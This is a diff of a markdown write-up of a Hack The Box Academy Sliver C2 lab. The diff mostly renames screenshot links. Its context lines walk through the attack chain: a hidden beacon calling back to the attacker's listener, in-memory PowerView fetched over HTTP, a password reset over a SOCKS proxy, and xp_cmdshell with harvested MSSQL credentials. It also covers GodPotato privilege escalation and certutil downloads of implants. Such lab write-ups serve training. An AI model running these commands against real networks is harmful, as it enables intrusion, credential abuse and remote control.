@@ -4,7 +4,8 @@
  sudo nmap -sC -sV -P 10.129.229.225
 ```
 
-![[Pasted image 20250814185930.png]]
+![BloodHound Analysis](images/silver1.png)
+
 domain name and winrm open
 
 The domain name is revealed to be sde.inlanefreight.local, which helps with initial login. I used xfreerdp3 and mounted a drive, to pass tools and an implant (Sliver-speak for an agent which we can control remotely).
@@ -23,7 +24,8 @@ generate beacon --http 10.10.15.253:9001 --skip-symbols -N initial_beacon_9001
 
 There are two main types of implants in Sliver that I have used throughout this module, beacon and session implants. The main difference is that beacons lie dormant and check in with the server periodically which sessions are consistent processes. I found that using beacons is great for initial access, as they can be converted to sessions and remain in the background for restabilising connections should something go wrong with a session (which seems to happen pretty often). Also note that in the implant generation command above, I used the –skip-symbols option, which will help keep the executable’s size down.
 
-![[Pasted image 20250814191003.png]]
+![BloodHound Analysis](images/silver2.png)
+
 sliver beacon implant compiled and saved to the directory I am sharing over rdp
 
 The implant is compiled and saved in the directory I am sharing via rdp so copying and executing it is trivial. I did so in the C:\Temp directory.
@@ -45,7 +47,7 @@ Before running the implant, on the sliver server I started up the listener.
 http -L 10.10.15.253 -l 9001
 ```
 
-![[Pasted image 20250814193121.png]]
+![BloodHound Analysis](images/silver3.png)
 
 running listeners in Sliver can be checked with the “jobs” command
 
@@ -54,7 +56,8 @@ Then, I started the implant with the following command on victim
 Start-Process -WindowStyle Hidden 'C:\Temp\initial_beacon_9001.exe'
 ```
 
-![[Pasted image 20250814193327.png]]
+![BloodHound Analysis](images/silver4.png)
+
 A beacon appears, which can be connected to with the ‘use’ command
 
 One of the best features of Sliver is the ability to install addons via the “armory” I installed the sharphound-4 ingestor for bloodhound previously. I will run this while doing some exploration.
@@ -62,13 +65,20 @@ One of the best features of Sliver is the ability to install addons via the “a
 Running sharp hound ingest in the background
 
 Sharphound is being run via .NET assembly being injected into a notepad.exe process. Many of the Sliver commands do this with a combination of using the printspooler (spoolsv.exe) by default. This shows the flexibility and customization that is possible with Sliver to avoid detection.
-![[Pasted image 20250814195220.png]]harphound hiding in a notepad.exe process
+
+
+![BloodHound Analysis](images/silver5.png)
+
+
+sharphound hiding in a notepad.exe process
 
 Sharphound completed very quickly, however there are some warnings as to an inability to enumerate the parent domain, inlanefreight.local.
 
-![[Pasted image 20250814195326.png]]
+![BloodHound Analysis](images/silver6.png)
+
 so i will download the zip file
-![[Pasted image 20250814200528.png]]
+
+![BloodHound Analysis](images/silver7.png)
 
 than run
 
@@ -82,12 +92,18 @@ and
 bloodhound
 ```
 
-![[Pasted image 20250814201653.png]]
+![BloodHound Analysis](images/silver8.png)
+
+
 Even better, this user is a local administrator on the machine!
-![[Pasted image 20250814201802.png]]
+
+![BloodHound Analysis](images/silver9.png)
+
 To change this user’s password we could just jump back on the rdp session and use _net user_ or _Set-ADUser_ but what would the fun in that be? As this is a Sliver module, and we know we are going to have to pivot anyways, if we use the ifconfig command on our implant we can see that SRV09.sde.inlanefreight.local has two network interfaces, one being for the internal domain network. To change this user’s password we will need to communicate with the domain controller, which is currently unreachable from our attack box. First let’s get the hostname and ip address for the domain controller for the sde.inlanefreight.local domain.
 
-![[Pasted image 20250814201938.png]]
+![BloodHound Analysis](images/silver10.png)
+
+
 While there is an armory version of sharpview, I found it easier to chain commands with the OG version of PowerView.ps1. Using the sharpsh armory module, we can run PowerView in memory by formatting the command in base64
 On kali:
 
@@ -99,10 +115,12 @@ In the sliver implant:
 sharpsh -- '-u http://10.10.15.253:8080/PowerView-Dev.ps1 -e  -c  R2V0LURvbWFpbkNvbXB1dGVyIHwgc2VsZWN0IG5hbWUgfCBSZXNvbHZlLUlQQWRkcmVzcw== '
 ```
 
-![[Pasted image 20250814203933.png]]
+![BloodHound Analysis](images/silver11.png)
+
 For good measure, I added these entries to /etc/hosts for name resolution just in case.
 
-![[Pasted image 20250814204836.png]]
+![BloodHound Analysis](images/silver12.png)
+
 Sliver even comes with a built in SOCKS proxy so we can use our session to reach the internal ips with proxychains, just make sure that the same port is specified in the /etc/proxychains.conf file. This proxy is tied to the sesssion, however so if the implant goes down anything connnected via the proxy will also go down!
 
 ```
@@ -119,7 +137,7 @@ To change the user’s password over the proxy, I will use BloodyAD, a nice AD �
 proxychains bloodyAD --host 172.16.84.5 -d sde.inlanefreight.local -u htb-student -p 'HTB_@cademy_stdnt!' set password felipe 'Password123!'
 ```
 
-![[Pasted image 20250814213309.png]]
+![BloodHound Analysis](images/silver13.png)
 
 Bloodhound said this user is local administrator, even though netexec doesn’t seem to pick this up (even with the –local-auth flag). A great thing about local admin privileges is that we can dump credentials as well as run commands over SMB. This gives us a lot of options for starting implants remotely.
 
@@ -128,9 +146,13 @@ proxychains -q impacket-wmiexec sde.inlanefreight.local/felipe:'Password123!'@sr
 ```
 
 it will run on background
-![[Pasted image 20250814223400.png]]
+
+![BloodHound Analysis](images/silver14.png)
+
 let see our beacon
-![[Pasted image 20250814223534.png]]
+
+![BloodHound Analysis](images/silver15.png)
+
 new implant opened as felipe
 
 This allows us to get the first two flags
@@ -139,13 +161,13 @@ execute -o powershell -c 'cat C:\Users\felipe\Desktop\flag.txt'
 
 ```
 
-![[Pasted image 20250814223958.png]]
+![BloodHound Analysis](images/silver16.png)
 
 ```
 execute -o powershell -c 'cat C:\Users\Administrator\Desktop\flag.txt'
 ```
 
-![[Pasted image 20250814224108.png]]
+![BloodHound Analysis](images/silver17.png)
 
 ## Searching for the next step
 
@@ -157,12 +179,15 @@ At this point, I searched around quite a bit for the next step. It turns out it 
 ```
 
 
-![[Pasted image 20250814225528.png]]
+![BloodHound Analysis](images/silver18.png)
+
+
 lets see the directory
 ```
 execute -o powershell -c 'cat C:\Users\Administrator\Automation_Project\mssql_automation.ps1'
 ```
-![[Pasted image 20250814225720.png]]
+![BloodHound Analysis](images/silver19.png)
+
 Mssql credentials found in a file
 
 This note gives us credentials for the mssql service on the DC02.sde.inlanefreight.local domain controller. I connected to it using impacket-mssqlclient:
@@ -171,15 +196,17 @@ This note gives us credentials for the mssql service on the DC02.sde.inlanefreig
 proxychains impacket-mssqlclient dbuser:'D@tab3s_PRoj3ct0@'@172.16.84.5
 ```
 
-![[Pasted image 20250821220146.png]]
+![BloodHound Analysis](images/silver20.png)
+
 This makes it very easy to attempt to enable command execution using xp_cmdshell. This is only possible if the user is an admin, but in this case it worked!
 
-![[Pasted image 20250821220447.png]]
+![BloodHound Analysis](images/silver21.png)
 
 enable_xp_cmdshell is successful
 
 With xp_cmdshell, we can execute operating system commands including enumerating the mssql service account privileges. As shown below, the SeImpersonatePrivilege is present and has many well known token impersonation attacks available to escalate to NT Authority/System.
-![[Pasted image 20250821220538.png]]
+
+![BloodHound Analysis](images/silver22.png)
 
 
 SeImpersonatePrivilege on the mssql service account
@@ -195,7 +222,7 @@ pivots tcp
 generate --tcp-pivot 172.16.84.20:9898 --skip-symbols -N god_pivot
 ```
 
-![[Pasted image 20250821221757.png]]
+![BloodHound Analysis](images/silver23.png)
 
 generating a pivot implant and creating the pivot listener job on port 9898
 
@@ -204,13 +231,15 @@ Next, to be able to download files from our attack host to DC02, we need to enab
 rportfwd add -b 172.16.84.20:8081  -r 10.10.14.39:8081 
 
 ```
-![[Pasted image 20250821222159.png]]
+![BloodHound Analysis](images/silver24.png)
 
 enabling reverse port forwarding to access http server on port 8081 on our attack host
 
 Then, we can can start up a python web server on port 8081 and use commands such as certutil to download the godpotato and pivot implant to DC02.
 
-![[Pasted image 20250821223003.png]]
+
+![BloodHound Analysis](images/silver25.png)
+
 Files downloaded to DC02 via reverse port forwarding
 ```
 xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/god_pivot.exe C:\Temp\god_pivot.exe
@@ -221,9 +250,13 @@ xp_cmdshell certutil -urlcache -f http://172.16.84.20:8081/god.exe C:\Temp\god.e
 
 ```
 
-![[Pasted image 20250821224220.png]]
+![BloodHound Analysis](images/silver26.png)
 
-![[Pasted image 20250821224242.png]]
+
+
+
+![BloodHound Analysis](images/silver27.png)
+
 With the privilege escalation executable and pivot implant in place, we are ready to launch the implant with SYSTEM privileges.
 
 ## Flag #3, escalate to system and read the flag in the Domain Admins desktop on DC02
@@ -234,17 +267,16 @@ With the privilege escalation executable and pivot implant in place, we are read
 
 ```
 
-![[Pasted image 20250821224326.png]]
+![BloodHound Analysis](images/silver28.png)
+
 This will allow us to read the third flag on the DC just as before.
 
-![[Pasted image 20250821224630.png]]
+![BloodHound Analysis](images/silver29.png)
 
 
 ```
 execute -o powershell -c 'cat C:\Users\Administrator\Desktop\flag.txt'
 ```
-
-![[Pasted image 20250821225017.png]]
 
 
 ## Flag #4, pivot to the parent domain controller, DC01.
